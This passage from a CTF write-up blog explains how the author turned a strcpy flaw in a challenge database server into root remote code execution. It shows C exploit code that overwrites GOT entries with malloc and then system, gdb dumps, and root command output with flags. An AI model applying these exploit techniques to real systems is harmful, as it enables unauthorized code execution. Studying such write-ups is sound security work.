  <p>Attachment: <a href="https://kileak.github.io/assets/t19/l4/xpl_client4.c">xpl_client4.c</a> <a href="https://kileak.github.io/assets/t19/l4/xpl4.py">xpl4.py</a></p>
</blockquote>

<p>From my first approach, it was presumably possible to gain rce, if one could get a real arbitrary write and not just reusing available data.</p>

<p>It took some time to find all pieces together, but let’s start with <code class="language-plaintext highlighter-rouge">check_entry</code> again. The only possibility to get an arbitrary write would be, if we could somehow use our package content as a source for the <code class="language-plaintext highlighter-rouge">strcpy</code>.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">───────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffe250  →  0x0000000000000000
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x00007fffffffe2ce  →  0x4141414141414141 ("AAAAAAAA"?)
$rsp   : 0x00007fffffffe240  →  0x0000000000603120  →  0x0000000000000000
$rbp   : 0x00007fffffffe290  →  0x00007fffffffe3e0  →  0x0000000000401980  →   push r15
$rsi   : 0x00007fffffffe2ce  →  0x4141414141414141 ("AAAAAAAA"?)
$rdi   : 0x00007fffffffe250  →  0x0000000000000000
$rip   : 0x0000000000400e53  →   call 0x4009b0 &lt;strcpy@plt&gt;
$r8    : 0x13d2            
$r9    : 0x13d2            
$r10   : 0x00007fffffffe3cd  →  0xffffffe4c0000000
$r11   : 0x13d2            
$r12   : 0x0000000000400b20  →   xor ebp, ebp
$r13   : 0x00007fffffffe4c0  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400e48                  mov    eax, 0xc0458d48
     0x400e4d                  mov    rsi, rdx
     0x400e50                  mov    rdi, rax
 →   0x400e53                  call   0x4009b0 &lt;strcpy@plt&gt;
   ↳    0x4009b0 &lt;strcpy@plt+0&gt;   jmp    QWORD PTR [rip+0x20266a]        # 0x603020
        0x4009b6 &lt;strcpy@plt+6&gt;   push   0x1
        0x4009bb &lt;strcpy@plt+11&gt;  jmp    0x400990
        0x4009c0 &lt;puts@plt+0&gt;     jmp    QWORD PTR [rip+0x202662]        # 0x603028
        0x4009c6 &lt;puts@plt+6&gt;     push   0x2
        0x4009cb &lt;puts@plt+11&gt;    jmp    0x400990
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe240│+0x0000: 0x0000000000603120  →  0x0000000000000000	 ← $rsp
0x00007fffffffe248│+0x0008: 0x00007fffffffe2ce  →  0x4141414141414141
0x00007fffffffe250│+0x0010: 0x0000000000000000	 ← $rax, $rdi
0x00007fffffffe258│+0x0018: 0x0000000000401927  →   mov QWORD PTR [rbp-0x10], rax
0x00007fffffffe260│+0x0020: 0x00007fffffffe2c0  →  0x0000000000000000
0x00007fffffffe268│+0x0028: 0x0000000400000000
─────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
strcpy@plt (
   $rdi = 0x00007fffffffe250 → 0x0000000000000000,
   $rsi = 0x00007fffffffe2ce → 0x4141414141414141,
   $rdx = 0x00007fffffffe2ce → 0x4141414141414141,
   $rcx = 0x0000000000000000
)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── extra ────
[+] Hit breakpoint *0x400e53 (copy_one)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 2, 0x0000000000400e53 in ?? ()
gef➤ </code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤ x/30gx $rsp
0x7fffffffe240:	0x0000000000603120	0x00007fffffffe2ce
0x7fffffffe250:	0x0000000000000000	0x0000000000401927
0x7fffffffe260:	0x00007fffffffe2c0	0x0000000400000000
0x7fffffffe270:	0x0000000000000000	0x0000000000603120 &lt;= offset / destptr
0x7fffffffe280:	0x00000000b1ea13d2	0x322ae0f85f7e0d00
0x7fffffffe290:	0x00007fffffffe3e0	0x0000000000401117
0x7fffffffe2a0:	0x00007fffffffe4c8	0x0000000100000000
0x7fffffffe2b0:	0x0000000000000000	0x0000000000000004
0x7fffffffe2c0:	0x0000000000000000	0x4141023737374144 &lt;= src package
0x7fffffffe2d0:	0x4141414141414141	0x4141414141414141
0x7fffffffe2e0:	0x4141414141414141	0x66c0414141414141
0x7fffffffe2f0:	0x3004ffffffffffbc	0x000000007ffff7ff
0x7fffffffe300:	0x0000000000000000	0x0000000000000000
0x7fffffffe310:	0x0000000000000000	0x0000000000000000
0x7fffffffe320:	0x0000000000000000	0x0000000000000000
gef➤  </code></pre></figure>

<p>I tried to use a negative offset to wrap around memory space to access the values from my payload, but it turned out, that it wasn’t possible to land in the range of the stack (at least it didn’t work out for me).</p>

<p>So, back to overwriting <code class="language-plaintext highlighter-rouge">addr</code>, maybe get a better starting point, from which we could work towards the stack.</p>

<p>From my initial approach on stage 3 I remembered, that I stumbled over an 8 byte string there, followed by a stack address. But the application segfaulted, when using it, since <code class="language-plaintext highlighter-rouge">memcmp</code> found a string at that address and thus <code class="language-plaintext highlighter-rouge">check_entry</code> continued walking over the stack until it went out of the mapped area, at which point I rejected it earlier.</p>

<p>I decided to give it another try</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/10gx 0x7ffff7bbe2f0
0x7ffff7bbe2f0 &lt;__vdso_getcpu&gt;:       0x80e5accf841b0796	0x00007fffffffe4c8
0x7ffff7bbe300 &lt;__libc_argc&gt;:         0x0000000000000001	0x0000000000000000
0x7ffff7bbe310 &lt;__gconv_alias_db&gt;:    0x0000000000000000	0x0000000000000000
0x7ffff7bbe320 &lt;__gconv_modules_db&gt;:  0x0000000000000000	0x0000000000000000
0x7ffff7bbe330 &lt;__gconv_path_envvar&gt;: 0x0000000000000000	0x0000000000000000</code></pre></figure>

<p>Validated that this address also looked similar remote (it was just a bit off due to different stack layout).</p>

<p>The application crashed again, since <code class="language-plaintext highlighter-rouge">memcmp</code> returned a value <code class="language-plaintext highlighter-rouge">!= 0</code>… So, why not overwrite <code class="language-plaintext highlighter-rouge">memcmp</code> with something, that wouldn’t do that. After some searching for good reference addresses, I found the <code class="language-plaintext highlighter-rouge">got</code> table in <code class="language-plaintext highlighter-rouge">/lib/x86_64-linux-gnu/libz.so.1.2.8</code> at <code class="language-plaintext highlighter-rouge">0x7ffff7dd8000</code>.</p>

<p>This address is in a good range for a negative offset from the mapped db region, and it contains a pointer to <code class="language-plaintext highlighter-rouge">malloc.plt</code>.
Passing a stack address as a parameter will result in <code class="language-plaintext highlighter-rouge">malloc</code> failing to allocate memory and always just return <code class="language-plaintext highlighter-rouge">0</code>. Perfect…</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">long</span> <span class="n">db_addr</span> <span class="o">=</span> <span class="mh">0x00007ffff7ff3000</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">Package</span> <span class="n">pkg</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">PackageContent</span> <span class="n">answer</span><span class="p">;</span>

    <span class="n">initConnection</span><span class="p">();</span>    

    <span class="c1">// Initialize database</span>
    <span class="n">sendPackage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pkg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">answer</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

    <span class="c1">// Overwrite memcmp with malloc</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Overwrite memcmp with malloc</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
    
    <span class="n">setval</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mh">0x7ffff7dd80f8</span> <span class="o">-</span> <span class="n">db_addr</span><span class="p">);</span> <span class="c1">// Offset to pointer to malloc.plt in libz</span>
    <span class="n">setval</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mh">0x603070</span><span class="p">);</span>                 <span class="c1">// memcmp got</span>
    
    <span class="n">sendPackage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pkg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">answer</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>Now, we can safely copy the address from <code class="language-plaintext highlighter-rouge">vdso_getcpu</code> to <code class="language-plaintext highlighter-rouge">0x603100</code>, which will overwrite the <code class="language-plaintext highlighter-rouge">addr</code> ptr with a stack pointer. And since <code class="language-plaintext highlighter-rouge">memcmp</code> will now return <code class="language-plaintext highlighter-rouge">0</code>, it will exit <code class="language-plaintext highlighter-rouge">check_entry</code> properly, leaving us with a new base address.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Overwrite addr pointer with a stack pointer</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Overwrite db pointer</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
    
<span class="n">setval</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mh">0x7ffff7bbe2f0</span> <span class="o">-</span> <span class="n">db_addr</span><span class="p">);</span>  <span class="c1">// Offset to vdso_getcpu</span>
<span class="n">setval</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mh">0x603108</span><span class="p">);</span>                  <span class="c1">// addr</span>

<span class="n">sendPackage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pkg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">answer</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>

<span class="n">db_addr</span> <span class="o">=</span> <span class="n">stack_addr</span><span class="p">;</span>                          <span class="c1">// Base address has now changed</span></code></pre></figure>

<p><code class="language-plaintext highlighter-rouge">addr</code> will now point to the stack address stored at <code class="language-plaintext highlighter-rouge">vsdo_getcpu</code>. Also leaked it <em>before</em> overwriting <code class="language-plaintext highlighter-rouge">addr</code> and then updated <code class="language-plaintext highlighter-rouge">db_addr</code> accordingly afterwards to calculate with the correct new base address from then on.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Leak stack address from vdso_getcpu</span>
<span class="n">read_index</span><span class="p">(</span><span class="n">pkg</span><span class="p">,</span> <span class="n">answer</span><span class="p">,</span> <span class="p">((</span><span class="mh">0x7ffff7bbe2f0</span> <span class="o">-</span> <span class="n">db_addr</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x21</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>

<span class="kt">long</span> <span class="n">stack_addr</span> <span class="o">=</span> <span class="n">get_from_offset</span><span class="p">(</span><span class="n">answer</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span></code></pre></figure>

<p>We can now place an arbitrary value in our payload, which won’t be copied by <code class="language-plaintext highlighter-rouge">strcpy</code>, but will be available on the stack (in our source package, the server received). Since the new base address now points behind our package payload on the stack, we can easily address values from it with a negative offset.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">write_value</span><span class="p">(</span><span class="k">struct</span> <span class="n">Package</span> <span class="o">*</span><span class="n">pkg</span><span class="p">,</span> <span class="k">struct</span> <span class="n">PackageContent</span> <span class="o">*</span><span class="n">answer</span><span class="p">,</span> <span class="kt">long</span> <span class="n">address</span><span class="p">,</span> <span class="kt">long</span> <span class="n">value</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">payload</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">}</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>           <span class="c1">// Copy prefix payload into package (command to execute)</span>

    <span class="n">setval</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mh">0x1c0</span> <span class="o">-</span> <span class="n">db_addr</span><span class="p">);</span>   <span class="c1">// Offset to the value in our payload</span>
    <span class="n">setval</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="n">address</span><span class="p">);</span>                        <span class="c1">// Destination address</span>
    <span class="n">setval</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>                          <span class="c1">// Value in payload</span>

    <span class="n">sendPackage</span><span class="p">(</span><span class="n">pkg</span><span class="p">,</span> <span class="n">answer</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>With this we now have an arbitrary write-what-where now and I already wanted to start writing a ropchain, when I realized we’re already at the finish line. We can just overwrite <code class="language-plaintext highlighter-rouge">memcmp</code> again, but this time with <code class="language-plaintext highlighter-rouge">system</code>, resulting in rce.</p>

<p>Since <code class="language-plaintext highlighter-rouge">memcmp</code> will be called in <code class="language-plaintext highlighter-rouge">check_entry</code> with our payload as a parameter and the application will crash again after that, because <code class="language-plaintext highlighter-rouge">system</code> will return a non null value, we also have to provide the command to execute directly in that payload.</p>

<p>Also, we won’t be able to retrieve the output from our command, since the application will crash before sending any response package. But we can get around this by just piping the output into <code class="language-plaintext highlighter-rouge">/tmp</code> and then read it via the stage1 exploit.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Execute command"</span><span class="p">);</span>
<span class="kt">long</span> <span class="n">system</span> <span class="o">=</span> <span class="mh">0x7ffff785f480</span><span class="p">;</span>

<span class="kt">char</span> <span class="n">cmd</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

<span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">sprintf</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"%s &gt; /tmp/output;#"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="p">}</span>

<span class="n">write_value</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pkg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">answer</span><span class="p">,</span> <span class="mh">0x603070</span><span class="p">,</span> <span class="n">system</span><span class="p">,</span> <span class="n">cmd</span><span class="p">);</span></code></pre></figure>

<p>Since the server is run by <code class="language-plaintext highlighter-rouge">root</code> all our commands will also be executed in <code class="language-plaintext highlighter-rouge">root</code> context, so we have a meta-root-shell now:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">id

{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"Stack addr: 0x7fffffffeaa8[+] Overwrite memcmp with malloc [+] Overwrite db pointer [+] Execute commandid &gt; /tmp/output;# @þÿÿÿÿÿÿp0` w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"uid=0(root) gid=0(root) groups=0(root) w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}

ls -al /opt/db

{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"Stack addr: 0x7fffffffeaa8[+] Overwrite memcmp with malloc [+] Overwrite db pointer [+] Execute commandls -al /opt/db &gt; /tmp/output;# @þÿÿÿÿÿÿp0` w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"total 24
dr-x-----T 1 root root 4096 Dec 26 15:26 .
drwxr-xr-x 1 root root 4096 Jan 15 16:19 ..
-r-------- 1 root root 31 Nov 29 14:56 .flag.pwn
---------- 1 root root 56 Dec 18 21:59 .flag.unexpected
-rw------- 1 root root 198 Dec 18 09:44 base
w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}

cat /opt/db/.*

{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"Stack addr: 0x7fffffffeaa8[+] Overwrite memcmp with malloc [+] Overwrite db pointer [+] Execute commandcat /opt/db/.* &gt; /tmp/output;# @þÿÿÿÿÿÿp0` w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"Error on socket connect w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"flag{twistl0ck_fin4l_fl4g_!!!} flag{!!!Well_this_is_was_honestly_not_expeted_grats!!!} w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}</code></pre></figure>

<p>And there it is, the hidden flag <code class="language-plaintext highlighter-rouge">flag{!!!Well_this_is_was_honestly_not_expeted_grats!!!}</code>, which gave us <code class="language-plaintext highlighter-rouge">0xffff</code>.</p>


    <aside class="share">

      <span>Share this: </span>

      <a href="http://twitter.com/share?text=The T19 challenge&amp;url=https://kileak.github.io/ctf/2019/T19Challenge/"
      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <i class="icon icon-twitter-rounded"></i>
      </a>

      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2019/T19Challenge/"
      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <i class="icon icon-facebook-rounded"></i>
      </a>

    </aside>
  </div>

  
  <hr>
  <aside id="comments" class="disqus">
    <div class="container">
      <h3><i class="icon icon-comments-o"></i> Comments</h3>
      <div id="disqus_thread"></div>

      <script type="text/javascript">
        var disqus_shortname = 'kileak';
        var disqus_identifier = '/ctf/2019/T19Challenge';
        var disqus_title = 'The T19 challenge';
        var disqus_url = 'https://kileak.github.io/ctf/2019/T19Challenge';

        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>

      <noscript>
        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
      </noscript>
    </div>
  </aside>



</article>

        </section>

        
<div class="clearfix"></div>

<footer class="site-footer txt-center">
  <hr>

  <ul class="social">
    
  </ul>

  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>

</footer>


    </main>

    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

    <script src="/js/jquery.min.js"></script>
    <script src="/js/jekyll-search.min.js"></script>
    <script src="/js/main.js"></script>
  </body>
</html>
